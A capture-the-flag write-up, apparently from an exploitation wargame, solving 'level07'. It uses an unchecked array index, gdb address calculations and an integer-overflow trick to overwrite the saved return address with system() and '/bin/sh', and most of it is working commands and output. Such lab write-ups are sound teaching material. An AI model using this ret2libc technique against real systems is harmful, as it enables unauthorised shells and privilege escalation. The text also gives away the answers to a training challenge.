
# Level07 - Exploiting an Out-of-Bounds Array Access Vulnerability

## Objective

The goal of this challenge is to exploit an out-of-bounds array access vulnerability in the program to overwrite the instruction pointer (EIP) and execute a ret2libc attack.

## Step 1: Running the Program

First, let's run the program to observe its behavior:

```bash
$ ./level07
----------------------------------------------------
Welcome to wil's crappy number storage service!   
----------------------------------------------------
Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
wil has reserved some storage :>                 
----------------------------------------------------
Input command: store
Number: 42
Index: 0
*** ERROR! ***
This index is reserved for wil!
*** ERROR! ***
Failed to do store command
Input command: read
Index: 0
Number at data[0] is 0
Completed read command successfully
```

The program stores numbers in an array and allows reading from the array. However, there is no proper bounds checking on the indices, allowing us to access memory outside the array.

## Step 2: Exploiting Out-of-Bounds Access

By specifying indices beyond the array bounds, we can access arbitrary memory locations:

```bash
Input command: store
Number: 42
Index: 160
Completed store command successfully
Input command: read
Index: 160
Number at data[160] is 42
Completed read command successfully
```

### Negative Indices

Negative indices access memory locations before the start of the array:

```bash
Input command: store
Number: 42
Index: -2
Completed store command successfully
Input command: read
Index: -2
Number at data[4294967294] is 42
Completed read command successfully
```

### Finding the Array Address in Memory

To exploit this, we need the base address of the array in memory. Set a breakpoint at the start of the `read_number` function:

```bash
(gdb) b read_number
(gdb) r
```

Check the address of the array:

```bash
(gdb) x/x $ebp+0x8
0xffffd440: 0xffffd464
```

The array starts at `0xffffd464`. To find the index in the array where this address is stored:

```bash
0xffffd440 - 0xffffd464 = -36
-36 / 4 = -9
```

This calculation shows the array index `-9` holds the base address.

## Step 3: Finding EIP in the Array

Next, find the index of the EIP in the array:

1. Set a breakpoint in the main function and get EIP:

   ```bash
   (gdb) b *main+520
   (gdb) c
   ```

2. Check the saved EIP address:

   ```bash
   (gdb) i f
   eip at 0xffffd62c
   ```

3. Calculate the index of EIP in the array:

   ```bash
   0xffffd62c - 0xffffd464 = 456
   456 / 4 = 114
   ```

EIP is stored at index `114`, but this index is protected (index % 3 == 0). To bypass, use integer overflow:

```bash
1073741938 % 3 = 1
```

## Step 4: Overwriting EIP with `system()`

Overwrite EIP with the address of `system()`:

```bash
(gdb) info function system
0xf7e6aed0  system
```

Use index `1073741938` to write to index `114`.

## Step 5: Setting the Argument for `system()`

Set the argument `/bin/sh` at index `116`:

```bash
(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
```

In decimal, the address is `4160264172`.

## Step 6: Executing the Exploit

Perform the exploit:

```bash
$ ./level07
Input command: store
Number: 4159090384
Index: 1073741938
Completed store command successfully
Input command: store
Number: 4160264172
Index: 116
Completed store command successfully
Input command: quit
$ whoami
level08
```

## Summary

- The program has an out-of-bounds vulnerability allowing access beyond the array limits.
- By calculating the correct indices, we can read and overwrite EIP with a `system()` address.
- Set the argument for `system()` as `/bin/sh`, achieving a shell with escalated privileges.

This approach highlights the impact of insufficient bounds checking in memory access.
